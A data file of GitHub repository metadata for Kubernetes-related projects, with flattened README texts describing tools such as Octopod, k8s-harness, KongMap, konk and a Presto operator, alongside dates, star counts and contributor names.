fanjianhai,K8S,,https img blog csdnimg cn 20200818191122258 png x oss process image watermark typeZmFuZ3poZW5naGVpdGk shadow10 textaHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2ZhbmppYW5oYWk size16 colorFFFFFF t70 piccenter https github com fanjianhai K8S Kubernetes Kubernetes 00 01 Kubernetes 02 kubernetes 03 kubernetes 04 kubectl 05 flannel 06 coredns 07 08 K8Sdashboard 01 01 dubbok8s github 1 2 hosts C WindowsSystem32driversetchosts GitHub Start 192 30 253 112 github com 192 30 253 119 gist github com 151 101 184 133 assets cdn github com 151 101 184 133 raw githubusercontent com 151 101 184 133 gist githubusercontent com 151 101 184 133 cloud githubusercontent com 151 101 184 133 camo githubusercontent com 151 101 184 133 avatars0 githubusercontent com 151 101 184 133 avatars1 githubusercontent com 151 101 184 133 avatars2 githubusercontent com 151 101 184 133 avatars3 githubusercontent com 151 101 184 133 avatars4 githubusercontent com 151 101 184 133 avatars5 githubusercontent com 151 101 184 133 avatars6 githubusercontent com 151 101 184 133 avatars7 githubusercontent com 151 101 184 133 avatars8 githubusercontent com GitHub End dnsdns ipconfig flushdns https blog csdn net fanjianhai 594042358 qq com,2020-10-27T01:22:27Z,2020-12-29T10:15:34Z,n/a,User,4,25,17,28,main,fanjianhai,1,0,0,0,0,0,0
joshdavidson,firework8s,cdk8s#deploying-workloads#examples#homelab#k3d#k3s#k8s#kubernetes#kubernetes-cluster#kubernetes-objects#kubernetes-yaml#lab#self-hosted#typescript,Firework8s Firework8s is a collection of Kubernetes objects YAML files for deploying workloads in a home lab with k8s The home lab used for development of this project consists of a 3 node cluster managed by Rancher Project Structure Folder Description yaml examples Contains pure handcrafted Kubernetes YAML These files can be considered the gold standard for the project cdk8s examples Contains Cloud Development for Kubernetes cdk8s https github com awslabs cdk8s TypeScript files that can be used by cdk8s to generate Kubernetes YAML Deploy Using yaml examples Execute kubectl apply f against the directory you wish to deploy For example shell script cd yaml examples kubectl apply f sonarr Would deploy Sonarr to your Kubernetes cluster Using cdk8s examples Create a new cdk8s project project in Typescript and use it to generate Kubernetes YAML files for deployment shell script cd cdk8s examples mkdir build cd build cdk8s init typescript app npm run watch cp ts cdk8s synth Execute kubectl apply f against the application you wish to deploy For example shell script kubectl apply f dist jackett k8s yaml Would deploy Jackett from the cdk8s generated YAML to your Kubernetes cluster Applications The following applications are included as yaml and cdk8s examples Name Description Website bitwarden Free and open source password management service that stores credentials in an encrypted vault https bitwarden com bookstack Free and open source Wiki designed for creating beautiful documentation https www bookstackapp com ciao Private and public HTTP S monitoring https brotandgames com ciao cyberchef The cyber swiss army knife https github com gchq CyberChef flexget Multipurpose automation tool for all your media https flexget com gaps Gaps recommends gaps in your Plex Server movie library based on collection searches https github com JasonHHouse gaps grafana Open source analytics and interactive visualization web application https grafana com grocy Groceries and household management solution for your home https grocy info heimdalll Application dashboard and launcher https github com linuxserver Heimdall homeassistant Open source home automation https www home assistant io homer A very simple static homepage for your server https github com bastienwirtz homer huginn Create agents that monitor and act on your behalf https github com huginn huginn influxdb Open source time series database https www influxdata com jackett API support for your favorite torrent trackers https github com Jackett Jackett jellyfin The free software media system https jellyfin org komga Media server for comics mangas BDs with API and OPDS support https komga org lazylibrarian Follow authors and grab metadata for all your digital reading needs https github com lazylibrarian LazyLibrarian lidarr Music collection manager https lidarr audio mariadb Community developed commercially supported fork of the MySQL https mariadb org minecraft Minecraft server with selectable version https hub docker com r itzg minecraft server minecraft bedrock Minecraft Bedrock Dedicated Server with selectable version https hub docker com r itzg minecraft bedrock server mongodb NoSQL database https www mongodb com monitorr Monitors the status of local and remote network services websites and applications https github com Monitorr Monitorr mylar An automated Comic Book downloader cbr cbz for use with SABnzbd NZBGet and torrents https github com evilhero mylar mysql Open source relational database management system https www mysql com observium Network monitoring platform https www observium org ombi Gives your shared Plex or Emby users the ability to request content by themselves https ombi io organizr An HTPC Homelab services organizer https organizr app perkeep Software for modeling storing searching sharing and synchronizing data https perkeep org phpservermon PHP server monitor http www phpservermonitor org postgres Open source object relational database system https www postgresql org raneto Markdown powered knowledge base for Nodejs http raneto com readarr Book magazine comics eBook and audiobook manager Sonarr for eBooks http readarr com sickgear SickGear has proven the most reliable stable TV fork of the great Sick Beard family https github com SickGear SickGear smokeping Smokeping keeps track of your network latency https github com linuxserver docker smokeping snipe it Free and open source IT asset management https github com snipe snipe it sonarr Smart PVR for newsgroup and bittorrent users https sonarr tv stuffinspace A real time interactive WebGL visualisation of objects in Earth orbit http stuffin space tautulli Python based monitoring and tracking tool for Plex Media Server https github com Tautulli Tautulli transmission BitTorrent client https transmissionbt com trilium Hierarchical note taking application https github com zadam trilium ubooquity Home server for your comics and ebooks https github com linuxserver docker ubooquity varken Standalone application to aggregate data from the Plex ecosystem into InfluxDB https github com Boerderij Varken vscode VS Code running on a remote server accessible through the browser https github com linuxserver docker code server wallabag Self hosted application for saving web pages https wallabag org wekan The open source kanban built with Meteor https wekan github io,2020-10-21T02:15:20Z,2020-12-29T03:18:06Z,TypeScript,User,5,23,3,7,main,joshdavidson#a10kiloham,2,2,2,0,2,0,5
typeable,octopod,ci#devops#ghc#ghcjs#haskell#k8s#kubernetes#qa#rust,Octopod Octopod Docker Image https github com typeable octopod workflows Octopod 20Docker 20Image badge svg branch master https github com typeable octopod actions query workflow 3A 22Octopod Docker Image 22 branch 3Amaster octo CLI https github com typeable octopod workflows octo 20CLI badge svg branch master https github com typeable octopod actions query workflow 3A 22octo CLI 22 branch 3Amaster Documentation https github com typeable octopod workflows Documentation badge svg branch master https github com typeable octopod actions query workflow 3ADocumentation branch 3Amaster Octopod is a fully open source self hosted solution for managing multiple deployments in a Kubernetes cluster with a user friendly web interface Managing deployments does not require any technical expertise We created Octopod because we believe that everything we release should be rigorously tested however such desires greatly complicate the development workflow docs en PMcasestudy md leading to longer release cycles We use Octopod to mitigate the downsides of rigorously testing each feature by deploying every single change we make to a separate staging environment allowing QA to investigate each feature independently and in parallel Demo Documentation High level notes Overview docs en Overview md Project managment case study docs en PMcasestudy md Technical case study docs en Techcasestudy md Technical documentation Technical architecture docs en Technicalarchitecture md RU docs ru Technicalarchitecture md Control script guide docs en Controlscripts md RU docs ru Controlscripts md Octopod deployment guide docs en Octopoddeploymentguide md RU docs ru OctopoddeploymentwithK8S md Helm based Octopod project setup docs en Helm baseddeploymentguide md RU docs ru Helm baseddeploymentguide md octo CLI user guide docs en Octouserguide md RU docs ru Octouserguide md CI integration docs en Integration md Octopod security model docs en Securitymodel md RU docs ru Securitymodel md FAQ How long does it take to set up Octopod The longest part of setting up Octopod for your project will probably be writing Control Scripts docs en Controlscripts md In total you should be able to get things running in about a day Will Octopod work with my project if it uses X Yes Octopod is project agnostic If you can run your project in a Docker container then you can use Octopod with that project What do I need to know to set up Octopod You need to understand the basics of Kubernetes and be familiar with whatever hosting provider you will be using There is no need to know any special language you can write Control Scripts docs en Controlscripts md in whatever language you like Does Octopod work with my CI Yes If you can run arbitrary executables in your CI then you will be able to integrate it with Octopod Integration basically consists of calling our octo CLI tool to perform desired actions You can find more detail in the CI integration docs en Integration md doc How come I can t see the deployment logs in Octopod web app It s been excluded from the GUI because we don t have a good security story to accompany this feature yet Some secrets and credentials may leak to the project team using Octopod and potentially not everyone should have access to this data Why Haskell and Rust We believe that there is a lot to be gained in programming in general by being able to statically ensure invariants in your code One of the most practical ways of ensuring invariants is a good static type system Haskell and Rust are both languages that have very strong type systems This allows us to move fast without breaking things in the process Still have questions If you still have questions be sure to ask them in our Octopod Discussions https github com typeable octopod discussions,2020-12-08T14:11:58Z,2020-12-18T12:48:07Z,Haskell,Organization,3,23,1,10,develop,ilyakooo0#andor0#dredozubov,3,1,1,1,0,1,7
rocketseat-content,contrib-node-k8s,,,2020-09-03T23:56:08Z,2020-12-04T01:10:16Z,JavaScript,Organization,2,21,1,1,master,diego3g,1,0,0,0,0,0,0
carlosonunez,k8s-harness,ansible#kubernetes#ruby#testing#vagrant,k8s harness Test your apps in disposable prod like Kubernetes clusters insert gif here when ready But why k8s harness is for you if You have apps that run on Kubernetes in production GKE EKS AKS Rancher etc but you don t want to create and pay for Kubernetes clusters yourself and you want a prod like Kubernetes experience on your laptop without the hassles and you just want to run your tests in a clean cluster every time k8s harness is probably not for you if You want to learn how Kubernetes works under the hood check out Hightower s kubernetes the hard way https github com kelseyhightower kubernetes the hard way for that or you want to run long lived clusters on your laptop that you manage How it works content howitworks png k8s harness is simple 1 Create k8sharness a new k8sharness file 2 Run your tests k8s harness run run can take a long time depending on your network connection If you want to see more details behind what s going on enable debug output like this sh k8s harness debug run or this sh LOGLEVEL debug k8s harness run The nitty gritty Here s how it really works 1 k8s harness will look for a k8sharness file in the root of your repository 2 Once found it will create a two node k3s https github com rancher k3s cluster on your machine with Vagrant https vagrantup com and Ansible https ansible io 3 k8s harness will also provision a local insecure Docker registry into which you can push your app s Docker images 4 k8s harness will run your tests as defined by k8sharness in a Bash subshell 5 k8s harness destroys the cluster unless you keep it up with disable teardown If you re interested in the nitty gritty of how k8s harness works check out its tests https github com carlosonunez k8s harness blob master tests for the details k8sharness k8s harness uses k8sharness files to determine what it should do once its cluster is provisioned An example file is provided at k8sharness example k8sharness example but the crux of how it works is this Define your test like this yaml test make test You can optionally add setup or teardown instructions too yaml test make test setup helm install f testenv yaml teardown make report Every command in test setup and teardown runs in a sh subshell but you can provide a script as well yaml test make test setup helm install f testenv yaml teardown scripts runteardown sh If you need to have more control over the subshell just start your test command with sh c yaml test make test setup helm install f testenv yaml teardown sh xc echo I m gonna wreck it Installing gem install k8s harness if you re installing this standalone or Include k8s harness into your app s Gemfile if you re building a Ruby or Rails app Options See k8sharness example https github com carlosonunez k8s harness blob master k8sharness example for documentation on how to configure your k8sharness file Run k8s harness help to learn how to configure k8s harness to your liking Questions Does this replace Docker Compose Nope Docker Compose is excellent for locally running your apps and testing that your app works in Docker However I ve found Compose to be lacking for testing whether my app can run with Kubernete s extra features like Secret s and Ingress objects As well for writing Ansible playbooks that provision hard Kuberntes infrastructure like installing CRDs I ve found having clean Kubernetes clusters that resemble what I m provisioning in production to be fast or at least faster than waiting for CI CD to apply my manifests and cost effective since I don t need to provision my own Kubernetes clusters externally My production Kubernetes clusters has x How do I install x in k8s harness This is not supported yet but is on the roadmap Contributing Thanks for helping make k8s harness better Contributing is simple What You ll Need To Install Vagrant Virtualbox Ansible How to contribute 1 Fork this repository 2 Add a test in tests NOTE If you re adding a new feature to k8s harness you ll also need to add an integration test in tests integration to describe what the feature does how users should use it and what they can expect when it runs See the integration test for run tests integration runspec rb for an example 3 Add your code in lib 4 Run your unit tests make unit 5 Run the integration test to ensure that everything works make integration 6 Push your commits up to your fork then submit a new pull request into this repo A note about pushing new gems You re free to fork this and create your own gems from a forked instance of this codebase Note that the CD that s included in the github github directory requires that you define GEMHOSTAPIKEY in your build,2020-10-25T16:11:06Z,2020-12-27T09:39:12Z,Ruby,User,1,20,0,0,master,,0,0,3,0,0,0,0
yesinteractive,kong-map,api#api-gateway#authentication#ci-cd#containers#devops#docker#k8s#kong#kong-gateway#kong-plugin#konga#kubernetes#kubernetes-ingress-controller#microservices#proxy#rest#rest-api#reverse-proxy#security,KongMap Kongmap is a free visualization tool which allows you to view and declaratively edit configurations of your Kong API Gateway Clusters including Routes Services and Plugins Policies The tool is available for installation on Docker and Kubernetes only at this time View list of latest changes updates here https github com yesinteractive kong map blob main CHANGELOG md GitHub https img shields io github license yesinteractive kong map style for the badge Docker Pulls https img shields io docker pulls yesinteractive kongmap style for the badge https hub docker com r yesinteractive kongmap Version https img shields io badge version 20201218 green style for the badge https github com yesinteractive kong map blob main CHANGELOG md Features Features Cluster View Cluster View Endpoint Analyzer Endpoint Analyzer Declarative Configuration Viewer Editor Declarative Configuration Viewer Editor Compatibility Compatibility Docker Installation Docker Installation Questions and Feedback Feedback and Issues Features Cluster View Allows an admin to view a dynamic map of their Kong API Gateway clusters and visually see relationships between Workspaces for Kong Enterprise Services Routes Endpoints and Plugins Policies Cluster view can also be used to see configuration of the proxy plane of your Kong for Kubernetes Ingress Controller Clicking on any entity displays details of the entity and related links Plugins can be toggled from view and map is searchable search by entity name Kong tag workspace url or any other details related to a Kong entity If editing is enabled any Kong entity can be edited from the Cluster View map Clicking on the edit button from any entity will send user directly to that entity in the declarative editor alt text https github com yesinteractive kong map blob main screenshots kongmap home png raw true kongmap Endpoint Analyzer View details of an API Endpoint Route The analyzer shows the Service attached to the endpoint route as well as provides a breakdown of all plugins policies in order of execution attached to the route endpoint For Kong Enterprise users all entities can be viewed directly via a link to Kong Manager If editing is enabled any Kong entity can be edited from the Endpoint Analyzer map Clicking on the edit button from any entity will send user directly to that entity in the declarative editor alt text https github com yesinteractive kong map blob main screenshots kongmap endpoint png raw true kongmap Declarative Configuration Viewer Editor KongMap is deployed with a browser based implementation of Kong s CLI tool decK Here you can view edit and export Kong declarative configurations for your open source and Enterprise clusters via YAML Configurations can easily be copied and pasted from one Kong cluster to another or between workspaces Declarative configuration editing can be disabled by KongMap configuration or managed via RBAC permissions if using Kong Enterprise The Viewer Editor can be invoked from the Cluster Map view by clicking on on any Kong entity and from any element from the Endpoint Analyzer Kong entity ID s can be toggled in and out of view with the viewer editor alt text https github com yesinteractive kong map blob main screenshots kongmap deck png raw true kongmap Compatibility KongMap supports both Kong Open Source and Kong Enterprise Clusters greater than version 1 3 and supports both DB and Non DB dbless Kong configurations KongMap also supports Kong for Kubernetes Ingress Controller versions greater than 0 5 In Kong for Kubernetes the Ingress Controller s proxy container must have its Admin API exposed in some fashion KongMap uses various public CDN s for various UI elements such as Bootstrap jQuery etc so KongMap will not display correctly in a browser on a closed network without Internet access Docker Installation Docker image is Alpine 3 11 based running PHP 7 3 on Apache The container exposes both ports 80 an 443 with a self signed certificated Below are instructions using the docker run command For an example using docker compose see the example in the examples directory folder https github com yesinteractive kong map blob main examples 1 Export Cluster Configurations to KONGCLUSTERS Environment Variable The connections to your Kong clusters are defined via JSON The below example illustrates adding two Kong clusters to KongMap json my enterprise cluster kongadminapiurl http kongapiurl 8001 kongeditconfig true kongent true kongenttoken admin kongenttokenname kong admin token kongentmanagerurl http kongmanagerurl 8002 my kong open source cluster kongadminapiurl http kongapiurl 8001 kongeditconfig true kongent false kongenttoken null kongenttokenname null kongentmanagerurl null Below is a definition of all variables in the KONGCLUSTERS json config All variables are required Parameter Description Required kongadminapiurl Full URL to Kong Admin API URL Example http kongadminapi 8001 yes kongeditconfig Boolean Set to true to allow editing of Kong configs via KongMap false will only allow readonly access to configs yes kongent Boolean Set true if you are connecting to a Kong Enterprise Cluster and to enable workspace support in KongMap Only the default workspace will show if set to false and connected to a Kong Entperprise cluster Otherwise set to false yes kongenttoken The admin token for connecting to your Kong Enterprise Cluster Admin API Set by RBAC configuration in Kong Can be set to null if not needed yes kongenttokenname The admin token header name for connecting to your Kong Enterprise Cluster Admin API Typically is kong admin token Can be set to null if not needed yes kongentmanagerurl Full URL to a Kong Manager if you wish to open entities in Kong Manager from KongMap Can be set to null if not needed or if you do not want any Kong Manager buttons shown for the cluster yes Export the config to a variable shell export KONGCLUSTERS my enterprise cluster kongadminapiurl http kongapiurl 8001 kongeditconfig true kongent true kongenttoken admin kongenttokenname kong admin token kongentmanagerurl http kongmanagerurl 8002 2 Start Container Run the container with the following command Set the ports to your preferred exposed ports The example below exposes KongMap on ports 8100 and 8143 Notice the KONGMAPURL variable Set this variable to the KongMap URL that you will connect to KongMap in your browser For example if running locally and exposing KongMap on port 8100 set to http localhost 8100 docker run d e KONGMAPCLUSTERSJSON KONGCLUSTERS e KONGMAPURL http urltokongmap 8100 p 8100 80 p 8143 443 yesinteractive kongmap Full documentation available online here https github com yesinteractive kong map https github com yesinteractive kong map 3 Authentication If you want to enable authentication to KongMap s UI it is recommended to run Kongmap behind your Kong Gateway and implement any authentication policies you feel is appropriate OIDC OAUTH2 Basic Auth etc at the gateway Feedback and Issues If you have questions feedback or want to submit issues please do so here https github com yesinteractive kong map issues https github com yesinteractive kong map issues,2020-10-01T19:06:11Z,2020-12-27T15:45:55Z,n/a,Organization,3,20,1,27,main,nikirago,1,0,0,4,3,0,0
k-mitevski,terraform-k8s,,Provisioning Kubernetes clusters on AWS with Terraform and EKS This repository contains the the sample code necessary to provision an EKS clusters with the ALB Ingress Controller Code samples 1 Provisioning EKS with eksctl eksctl README md 1 Basic provisioning of EKS with Terraform 01terraformeks README md 1 Multiple managed node pools with EKS and Terraform 02terraformnodepools README md 1 Setting up IAM policies for the ALB Ingress Controller in EKS with Terraform 03terraformalbingress README md 1 Integrating the Helm provider with Terraform and EKS 04terraformhelmprovider README md 1 Encapsulating clusters as Terraform modules 05terraformenvmodule README md 1 Parametrising clusters as Terraform modules 06terraformenvscustomised README md 1 Kubernetes files to deploy an Hello World application kubernetes README md,2020-09-18T14:14:51Z,2020-12-24T19:21:09Z,HCL,User,1,19,19,4,master,k-mitevski#danielepolencic,2,0,0,3,0,1,1
falarica,steerd-presto-operator,,SteerD Presto Kubernetes Operator Kubernetes https kubernetes io docs home is an open source container orchestration engine for automating deployment scaling and management of containerized applications Operators https kubernetes io docs concepts extend kubernetes operator are software extensions to Kubernetes that make use of custom resources to manage applications and their components Operators follow Kubernetes principles notably the control loop SteerD Presto Operator is a Kubernetes Operator for Presto to manage Presto clusters which are deployed as custom resources In short the task of configuring creating managing automatically scaling up and scaling in of Presto cluster s in a Kubernetes environment has been made simple easy and quick SteerD Presto Operator supports both PrestoDB and PrestoSQL forks Deploying Operator Deploying Operator Locally Step 1 Enable metrics server for k8s if not already enabled See this https github com kubernetes sigs metrics server This is needed for horizontal pod autoscaling Step 2 Build the operator bash go build o steerd presto operator cmd manager main go Step 3 Deploy the CRD bash kubectl apply f deploy crds falarica ioprestoscrd yaml Step 4 Start the controller with the right credentials bash steerd presto operator kubeconfig home hemant kube config Deploying Operator GKE Step 1 Enable metrics server for GKE if not already enabled See this https github com kubernetes sigs metrics server This is needed for horizontal pod autoscaling Step 2 Create Operator Image Using Google CloudBuild bash docker gcloudDockerBuild sh Step 3 Deploy the CRD bash kubectl apply f deploy crds falarica ioprestoscrd yaml Step 4 Update the Operator yaml with image name bash Here gcr io fluid tangent 249303 steerd presto operator is the name of image Replace it with your image name sed i s REPLACEIMAGE gcr io fluid tangent 249303 steerd presto operator g deploy operator yaml Step 5 Launch the operator bash kubectl apply f deploy operator yaml Deploy Presto Cluster Deploy the presto cluster bash Deploy Presto SQL For PrestoDB refer deploy crds falaricaprestodb yaml kubectl apply f deploy crds falarica iov1alpha1prestocr yaml Further Details Creating Presto Cluster docs prestoresource md Managing Presto Cluster docs status md Autoscaling docs autoscaling md Catalogs docs catalog md Services docs service md Additional Volumes docs additionalvolumes md HTTPS Support docs https md Caveats Future Work docs caveats md Community support Slack https join slack com t falarica sharedinvite zt gql1dl9i mm6lOJYgsEUuF6JXIgxCcA Slack http i imgur com h3sc6GM png contact falarica io contact falarica io,2020-09-05T04:37:35Z,2020-12-24T08:01:44Z,Go,Organization,9,19,4,4,master,hbhanawat#falaricaanalytics,2,0,0,0,0,0,1
snicoll,spring-boot-loves-k8s,demo-app#kubernetes#presentation#spring-boot,,2020-08-27T12:41:32Z,2020-11-24T15:54:24Z,Java,User,3,17,6,14,master,snicoll,1,0,0,0,0,0,0
InfraBuilder,benchmark-k8s-cni-2020-08,,benchmark k8s cni 2020 08 This repository contains assets for the Kubernetes CNI benchmark August 2020 by infraBuilder Twitter infrabuilder The benchmark is based on knb from the k8s bench suite https github com InfraBuilder k8s bench suite Benchmark protocol See PROTOCOL md PROTOCOL md CNI selection The CNI that are tested in this benchmark must be deployed with a one yaml file method All CNIs yaml file used are present in the cni cni directory If a CNI need options to kubeadm init like set the pod network cidr for example a file cni kopt will contain the options used during the test Run example Please note that benchmark sh benchmark sh uses setup sh setup sh the node deployment script that is tailored for our MaaS based lab environment All benchmark runs are recorded in Asciinema https asciinema org bash export KERNEL default export DISTRIBUTION 18 04 export CNI doc antrea asciinema rec results CNI u DISTRIBUTION KERNEL CNI u DISTRIBUTION KERNEL cast i 3 c benchmark sh Example asciicast https asciinema org a NXrptSXsjqEeYQn4Hg1R7gb5O png https asciinema org a NXrptSXsjqEeYQn4Hg1R7gb5O Results User friendly results Results for human being with charts and interpretation are available in an article on Medium Work in progress Still writing it for now Aggregated results You can also check aggregated results on the spreadsheet here https docs google com spreadsheets d 12dQqSGI0ZcmuEy48nA0PbPl7Yp17fNg7De47CYWzaM edit Values injected in the spreadsheet are in files results run tsv Raw results Raw results are available in this repository just check the results results directory for knbdata files You can generate reports with knb https github com InfraBuilder k8s bench suite for example bash knb fd results doc antrea u18 04 default doc antrea u18 04 default run1 knbdata o text or knb fd results doc antrea u18 04 default doc antrea u18 04 default run1 knbdata o json or knb fd results doc antrea u18 04 default doc antrea u18 04 default run1 knbdata o yaml As knbdata files are just simple tar gz archives you can also uncompress the file to see raw containers logs showing data even before being parsed by knb,2020-08-25T11:27:38Z,2020-12-19T08:52:41Z,Shell,Organization,4,16,5,43,master,AlexisDucastel,1,0,0,1,0,0,0
ansible-collections,kubernetes.core,ansible#ansible-collection#automation#hacktoberfest#k8s#kubernetes#openshift,Kubernetes Collection for Ansible This repo will be the future home of all kubernetes core development This Ansible Content Collection began as community kubernetes and as of the release of 1 1 0 is in the process of being transitioned to this new name See kubernetes community issue 221 https github com ansible collections community kubernetes issues 221 for more NOTE New issues and PRs should continue to be filed with community kubernetes until further notice yaml collections name kubernetes core version 1 1 1 It s preferable to use content in this collection using their Fully Qualified Collection Namespace FQCN for example kubernetes core k8sinfo yaml hosts localhost gatherfacts false connection local tasks name Ensure the myapp Namespace exists kubernetes core k8s apiversion v1 kind Namespace name myapp state present name Ensure the myapp Service exists in the myapp Namespace kubernetes core k8s state present definition apiVersion v1 kind Service metadata name myapp namespace myapp spec type LoadBalancer ports port 8080 targetPort 8080 selector app myapp name Get a list of all Services in the myapp namespace kubernetes core k8sinfo kind Service namespace myapp register myappservices name Display number of Services in the myapp namespace debug var myappservices resources count If upgrading older playbooks which were built prior to Ansible 2 10 and this collection s existence you can also define collections in your play and refer to this collection s modules as you did in Ansible 2 9 and below as in this example yaml hosts localhost gatherfacts false connection local collections kubernetes core tasks name Ensure the myapp Namespace exists k8s apiversion v1 kind Namespace name myapp state present More Information For more information about Ansible s Kubernetes integration join the ansible kubernetes channel on Freenode IRC and browse the resources in the Kubernetes Working Group https github com ansible community wiki Kubernetes Community wiki page License GNU General Public License v3 0 or later See LICENCE to see the full text,2020-10-09T16:50:32Z,2020-12-08T16:40:40Z,n/a,Organization,3,16,2,6,main,gundalow#geerlingguy#tima,3,0,0,0,1,0,3
redhat-actions,push-to-registry,action#buildah#cloud#containers#docker#k8s#kubernetes#openshift#redhat,push to registry Verify Bundle https github com redhat actions push to registry workflows Verify 20Bundle badge svg https github com redhat actions push to registry actions query workflow 3A 22Verify Bundle 22 tag badge https img shields io github v tag redhat actions push to registry https github com redhat actions push to registry tags license badge https img shields io github license redhat actions push to registry LICENSE size badge https img shields io github size redhat actions push to registry dist index js dist Push to registry is a GitHub Action for pushing a container image to an image registry such as Dockerhub Quay 46io the GitHub Container Registry or an OpenShift integrated registry This action only runs on Linux as it uses podman https github com containers Podman to perform the push GitHub s Ubuntu action runners https github com actions virtual environments available environments come with Podman preinstalled If you are not using those runners you must first install Podman https podman io getting started installation Action Inputs Input Required Description image Yes Name of the image you want to push tag No Image tag to push Defaults to latest registry Yes URL of the registry to push the image to Eg quay io ltusername gt username Yes Username with which to authenticate to the registry password Yes Password encrypted password or access token with which to authenticate to the registry tls verify No Verify TLS certificates when contacting the registry Set to false to skip certificate verification Action Outputs This action produces one output which can be referenced in other workflow steps registry path The registry path to which the image was pushed For example quay io username spring image v1 Examples The example below shows how the push to registry action can be used to push an image created by the buildah build https github com redhat actions buildah build action yaml name Build and Push Image on push jobs build name Build and push image runs on ubuntu latest env IMAGENAME my app IMAGETAG latest steps uses actions checkout v2 name Build Image uses redhat actions buildah build v1 with image env IMAGENAME tag env TAG dockerfiles Dockerfile name Push To Quay id push to quay uses redhat actions push to registry v1 with image env IMAGENAME tag env TAG registry secrets QUAYREPO username secrets QUAYUSERNAME password secrets QUAYTOKEN name Use the image run echo New image has been pushed to steps push to quay outputs registry path Troubleshooting Note that quay io repositories are private by default This means that if you push an image for the first time you will have to authenticate before pulling it or go to the repository s settings and change its visibility Contributing This is an open source project open to anyone This project welcomes contributions and suggestions Feedback Questions If you discover an issue please file a bug in GitHub issues https github com redhat actions push to registry issues and we will fix it as soon as possible License MIT See LICENSE LICENSE for more information,2020-11-13T14:47:26Z,2020-12-29T10:03:48Z,TypeScript,Organization,3,16,1,20,main,lstocchi#tetchel#Divyansh42,3,2,2,1,4,0,5
infobloxopen,konk,,konk konk Kubernetes On Kubernetes is a tool for deploying an independent Kubernetes API server within Kubernetes konk can be used as part of a larger application to manage resources via CustomResourceDefinitions and implement a CRUD API for those resources by leveraging kube apiserver Or implement an extension API server https kubernetes io docs concepts extend kubernetes api extension apiserver aggregation without worrying about breaking the parent cluster with a non compliant API https github com kubernetes kubernetes issues 96066 konk does not start a kubelet and therefore does not support any resources that require a node such as deployments and pods This repo provides a konk helm chart that can be used to deploy an instance of konk with helm and a konk operator that watches for konk CRs and will deploy a konk instance for each of them Office Hour Office Hour 9am PST 12pm EST on Fridays landing on even days https infoblox zoom us j 98130157567 https infoblox zoom us j 98130157567 konk chart Found in helm charts konk helm charts konk This chart will deploy konk Example usage helm install my konk helm charts konk helm test my konk konk operator konk operator is generated with operator sdk and implements a helm operator for the konk chart and the konk service chart Once deployed Konk and KonkService resources can be created in the cluster and the operator will deploy a konk instance and a konk service instance for each of them Example Konk CR examples konk yaml konk service chart Found in helm charts konk service helm charts konk service The konk service chart or KonkService CR will deploy the resources required to register an APIService in konk It requires an existing konk to be deployed in the cluster You need to specify the name of the konk and the name of the service that the APIService object being created should point to This would be specified under konk name and service name in the values yaml file Also specify the group and version values to be populated in the generated APIService KonkService spec doc helm charts konk service values yaml Example KonkService examples konk service yaml front proxy ingress Setting spec ingress enabled true in your KonkService will provision front proxy ingress to the APIService you registered in konk The front proxy certs are provisioned automatically yaml kind KonkService spec ingress enabled true hosts host my api example com tls hosts my api example com secretName my api example com tls Testing example apiserver chart Found in helm charts example apiserver helm charts example apiserver This chart will deploy an example apiserver instance which is a reference implementation of an extension API server and its usage with konk This chart requires an existing konk to be deployed in the cluster This chart also assumes that the konk operator has been deployed to the cluster since it involves creating a KonkService CR Optional stand up KIND make kind kind load konk Teardown cluster make kind destroy Install helm install my konk operator helm charts konk operator Create a konk examples konk yaml examples konk yaml is a simple manifest for a konk resource kubectl apply f https raw githubusercontent com infobloxopen konk master examples konk yaml konk konk infoblox com example konk created Observe your new konk kubectl get pods l app kubernetes io instance example konk NAME READY STATUS RESTARTS AGE example konk 6b4996448c skjxw 2 2 Running 0 83s example konk init d6cff859c 2w4bm 1 1 Running 0 83s Deploy example apiserver with konk make deploy example apiserver make test example apiserver Usage The example apiserver helm charts example apiserver in this project provides a complete usage example of Konk This section will cover some of the most important parts Accessing konk s apiserver You will need a kubeconfig to authenticate with konk s apiserver If you deploy a KonkService a kubeconfig will be generated and stored in a Secret that can be mounted in your pods The secret will be named like KonkService metadata name konk service kubeconfig A good example of accessing konk is test setup yaml helm charts konk service templates tests test setup yaml It relies on a template to determine the name of the secret You may wish to reuse this template It can be found in helpers tpl helm charts example apiserver templates helpers tpl L72 L80 Server Certificates in your extension API server KonkService will register your extension API server with konk Trust is established with a CA bundle The certs are generated by the KonkService and cert manager and must be loaded into the server for konk to trust it An example of that can be found in the example apiserver deployment helm charts example apiserver templates deployment yaml L99 L101 Here a secret named like KonkService metadata name konk service server is mounted as a volume into the path apiserver local config certificates and then loaded into the API server via command line arguments Optionally your service can bring its own certificates instead of relying on those generated by KonkService and cert manager To specify a custom certificate secret name set spec service caSecretName in KonkService and it will be registered with Konk by the KonkService Troubleshooting konk operator will update the status field on Konk and KonkService resources The contents here can be particularly helpful for determining why konk is not functioning properly Here s an example of a healthy konk status json kubectl get konks runner konk o jsonpath status conditions jq lastTransitionTime 2020 11 10T00 29 56Z status True type Initialized lastTransitionTime 2020 11 10T00 29 59Z message 1 Get the application URL by running these commands n export PODNAME kubectl get pods namespace default l app kubernetes io name konk app kubernetes io instance runner konk o jsonpath items 0 metadata name n echo Visit http 127 0 0 1 8080 to use your application n kubectl namespace default port forward PODNAME 8080 80n reason InstallSuccessful status True type Deployed reason InstallSuccessful is a good sign Here s an example of an unhealthy konk json k n aggregate get konks tagging aggregate api konk o jsonpath status conditions jq lastTransitionTime 2020 11 10T13 50 38Z status True type Initialized lastTransitionTime 2020 11 10T13 50 41Z message failed to install release rendered manifests contain a resource that already exists Unable to continue with install Service tagging aggregate api konk in namespace aggregate exists and cannot be imported into the current release invalid ownership metadata label validation error missing key app kubernetes io managed by must be set to Helm annotation validation error missing key meta helm sh release name must be set to tagging aggregate api konk annotation validation error missing key meta helm sh release namespace must be set to aggregate reason InstallError status True type ReleaseFailed reason InstallError means there was a problem while trying to reconcile the konk s resources The message explains exactly what the problem is there s a resource name conflict Service tagging aggregate api konk in namespace aggregate exists and cannot be imported into the current release One potential solution to this problem is to choose a more unique name for your Konk but in this particular case the conflicting resource was not longer needed and the problem was resolved by manually deleting it,2020-08-18T17:59:44Z,2020-12-18T17:38:17Z,HTML,Organization,13,14,5,121,main,kd7lxl#drewwells#dependabot[bot]#abalaven#pkbinfoblox#dependabot-preview[bot],6,0,3,12,11,6,132
